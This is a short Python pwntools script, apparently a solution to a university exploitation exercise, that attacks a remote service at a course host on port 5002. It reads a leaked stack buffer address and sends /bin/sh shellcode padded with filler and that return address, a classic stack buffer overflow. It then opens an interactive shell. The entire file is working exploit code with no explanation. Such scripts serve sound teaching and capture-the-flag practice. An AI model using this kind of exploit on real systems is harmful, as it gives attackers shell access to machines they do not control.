#!/usr/bin/env python3

from pwn import *

shellcode = asm(shellcraft.sh())
offset = 112 - len(asm(shellcraft.sh()))

local = False

if local:
    r = ELF('./shellcode').process()
else:
    r = remote('tpas.alunos.dcc.fc.up.pt', 5002)

s = r.recvuntil('> ')

r.sendline('2')  # string compare
s = r.recvuntil('Give me the first string: ')

buffer_addr = int(s.splitlines()[0].split()[-1], 16)
print(buffer_addr)

payload = shellcode + b'A' * offset + p32(buffer_addr)

r.sendline(payload)

s = r.recvuntil('Give me the second string: ')

r.sendline(b'')

r.interactive()
